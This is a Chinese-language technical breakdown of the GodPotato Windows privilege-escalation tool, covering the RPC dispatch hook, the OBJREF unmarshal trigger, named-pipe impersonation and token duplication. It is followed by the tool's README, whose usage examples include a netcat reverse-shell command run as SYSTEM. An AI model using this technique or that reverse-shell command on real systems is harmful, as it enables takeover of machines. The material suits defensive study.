这个仓库实现的是 **GodPotato：一个 C# 写的 Windows 本地提权工具/PoC**。它的目标不是远程打点，而是在已经拿到某个低权限服务账号、且该账号具备 `SeImpersonatePrivilege / ImpersonatePrivilege` 的前提下，诱导 COM/RPCSS 走到受控通信通道，然后通过命名管道模拟拿到高权限安全上下文，最终用该 token 启动用户指定命令。README 自称适用范围是 Windows Server 2012–2022、Windows 8–11；这个 `qqq694637644/GodPotato` 仓库是从 `BeichenDream/GodPotato` fork 出来的，代码语言是 C#。([GitHub][1])

我只做实现原理分析，不展开可直接复现提权的运行步骤。

## 它实现了什么

**核心功能：**
程序接收一个命令参数，然后尝试把当前低权限服务进程的上下文提升到 `NT AUTHORITY\SYSTEM`，再用拿到的 SYSTEM token 创建进程执行该命令。主入口 `Program.cs` 的流程很直接：解析 `cmd` 参数，创建 `GodPotatoContext`，打印 combase/RPC 相关地址，调用 `HookRPC()`，启动命名管道服务端，触发 DCOM unmarshal，最后从上下文里取 token 并交给 `SharpToken` 创建进程。([GitHub][2])

**它不是完整漏洞扫描器，也不是通用后门。**
代码里真正暴露的 CLI 参数只有 `cmd`；README 里提到“自定义 CLSID”的文字，但这个 fork 的 `Program.cs` 中 `GodPotatoArgs` 只有 `cmd` 一个属性，没有实现 `clsid` 参数解析。([GitHub][2])

## 它是如何实现的

### 1. 在当前进程里定位并 hook `combase.dll` 的 RPC 分发表

`GodPotatoContext` 会枚举当前进程模块，找到 `combase.dll`，然后在模块内存中搜索 ORCB/RPC 相关接口结构。它用固定 GUID `18f70770-8e64-11cf-9af1-0020af6e72f4` 拼出匹配模式，定位 `RPC_SERVER_INTERFACE`，再取出 `RPC_DISPATCH_TABLE`、`MIDL_SERVER_INFO`、dispatch table、proc string、format offset table 等信息。([GitHub][3])

定位成功后，它保存原始的第一个 RPC dispatch 函数指针，并根据 MIDL proc string 里读到的参数数量选择一个匹配签名的 delegate。`HookRPC()` 通过 `VirtualProtect` 改 dispatch table 内存权限，然后把 dispatch table 第一个入口改成自己的托管 delegate 指针；`Restore()` 再把原始函数指针写回去。([GitHub][3])

### 2. 伪造/改写 RPC 返回的绑定信息，把 COM/RPC 流量引到自己的命名管道

hook 后的 `NewOrcbRPC.fun()` 会构造一组新的 endpoint/binding 字符串，并写回 RPC 输出参数。关键点是它把 COM/RPC 后续通信引向本地受控的 named pipe，而不是正常 RPC 绑定。代码里 `GodPotatoContext` 定义了服务端 pipe 路径和客户端 binding 字符串，并在 hook 函数里构造 `pdsaNewBindings` 写入 `ppdsaNewBindings`。([GitHub][3])

这就是 GodPotato 的核心手法：不是直接“创建 SYSTEM token”，而是劫持 COM/DCOM 解析/绑定过程，让高权限的系统组件按攻击者指定的通信路径连接过来。

### 3. 启动命名管道服务端，并模拟连接过来的客户端

`PipeServer()` 创建一个 named pipe，并设置了一个较宽松的安全描述符。连接建立后，它调用 `ImpersonateNamedPipeClient()`，把当前线程切换到管道客户端的安全上下文。微软文档说明，`ImpersonateNamedPipeClient` 的作用正是让命名管道服务端模拟客户端端点的安全上下文。([GitHub][3])

模拟成功后，代码检查 impersonation level；如果级别足够，它会枚举进程 token，寻找 SID 为 `S-1-5-18`、完整性级别为 System、且可模拟级别足够的 token，然后保存为 `systemIdentity`。`S-1-5-18` 对应本地 SYSTEM 身份。相关 token 枚举、token 信息读取、`DuplicateTokenEx` 等逻辑在 `SharpToken.cs` 中实现。([GitHub][3])

### 4. 通过 COM OBJREF / unmarshal 触发 RPCSS 参与

`GodPotatoUnmarshalTrigger` 会创建一个普通 .NET 对象，拿到它的 `IUnknown` 指针，再调用 `CreateObjrefMoniker` 生成 COM OBJREF moniker。随后它解析 moniker display name 中的 OBJREF 数据，提取原始对象的 `OXID / OID / IPID`，重新构造一个 OBJREF，并把它交给 `CoUnmarshalInterface` 触发 COM/DCOM 的 unmarshalling 流程。([GitHub][4])

微软文档里 `CoUnmarshalInterface` 的用途就是从流中反序列化/取消封送接口指针，并创建相应代理对象；GodPotato 利用的就是这个过程中 COM 会去解析远端对象绑定信息、进而触发 RPCSS/RPC 交互。([Microsoft Learn][5])

### 5. 用拿到的 token 创建进程

主程序拿到 `systemIdentity.Token` 后调用 `TokenuUils.createProcessReadOut(...)`。`SharpToken.cs` 里可以看到它通过 `DuplicateTokenEx` 把 token 转成可用于创建进程的 primary token，然后优先尝试 `CreateProcessWithTokenW`，失败时再尝试 `CreateProcessAsUserW`。微软文档也说明，`CreateProcessWithTokenW` 会在指定 token 的安全上下文中创建新进程。([GitHub][2])

## 代码结构简图

`Program.cs`：主流程编排，解析命令、hook、触发、取 token、执行命令。
`ArgsParse.cs`：反射式参数解析器，目前实际只解析 `cmd`。
`NativeAPI/GodPotatoContext.cs`：核心，负责 combase RPC dispatch table 定位、hook、pipe server、token 捕获。
`NativeAPI/GodPotatoUnmarshalTrigger.cs`：构造/解析 OBJREF，并调用 COM unmarshal 触发 RPCSS 路径。
`NativeAPI/ObjRef.cs`：OBJREF、DualStringArray、StringBinding、SecurityBinding 的二进制读写。
`NativeAPI/IStreamImpl.cs` 和 `UnmarshalDCOM.cs`：把 byte array 包装成 COM `IStream`，交给 `CoUnmarshalInterface`。
`SharpToken.cs`：Windows token 枚举、复制、权限/完整性级别读取、创建进程等封装。([GitHub][6])

## 一句话总结

它的实现思路是：**hook 本进程里的 COM/RPC 绑定解析 → 构造 OBJREF 触发 DCOM/RPCSS → 让高权限 RPCSS 连接受控命名管道 → 通过命名管道模拟拿到 SYSTEM 上下文 → 复制 token 并创建指定命令进程。**

[1]: https://github.com/qqq694637644/GodPotato "GitHub - qqq694637644/GodPotato · GitHub"
[2]: https://raw.githubusercontent.com/qqq694637644/GodPotato/main/Program.cs "raw.githubusercontent.com"
[3]: https://raw.githubusercontent.com/qqq694637644/GodPotato/main/NativeAPI/GodPotatoContext.cs "raw.githubusercontent.com"
[4]: https://raw.githubusercontent.com/qqq694637644/GodPotato/main/NativeAPI/GodPotatoUnmarshalTrigger.cs "raw.githubusercontent.com"
[5]: https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-counmarshalinterface?utm_source=chatgpt.com "CoUnmarshalInterface function (combaseapi.h) - Win32 apps"
[6]: https://github.com/qqq694637644/GodPotato/tree/main/NativeAPI "GodPotato/NativeAPI at main · qqq694637644/GodPotato · GitHub"


# GodPotato


Based on the history of Potato privilege escalation for 6 years, from the beginning of RottenPotato to the end of JuicyPotatoNG, I discovered a new technology by researching DCOM, which enables privilege escalation in Windows 2012 - Windows 2022, now as long as you have "ImpersonatePrivilege" permission. Then you are "NT AUTHORITY\SYSTEM", usually WEB services and database services have "ImpersonatePrivilege" permissions.



Potato privilege escalation is usually used when we obtain WEB/database privileges. We can elevate a service user with low privileges to "NT AUTHORITY\SYSTEM" privileges.
However, the historical Potato has no way to run on the latest Windows system. When I was researching DCOM, I found a new method that can perform privilege escalation. There are some defects in rpcss when dealing with oxid, and rpcss is a service that must be opened by the system. , so it can run on almost any Windows OS, I named it GodPotato



# Affected version

Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11


# Example

```

    FFFFF                   FFF  FFFFFFF
   FFFFFFF                  FFF  FFFFFFFF
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF


Arguments:

        -cmd Required:True CommandLine (default cmd /c whoami)

Example:

GodPotato -cmd "cmd /c whoami"


```


Use the program's built-in Clsid for privilege escalation and execute a simple command


```
GodPotato -cmd "cmd /c whoami"
```

![](images/1.png)


Customize Clsid and execute commands

```
GodPotato -cmd "cmd /c whoami"

```


![](images/2.png)


Execute reverse shell commands

```
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
# Thanks

zcgonvh


skay


# License

[Apache License 2.0](/LICENSE) 
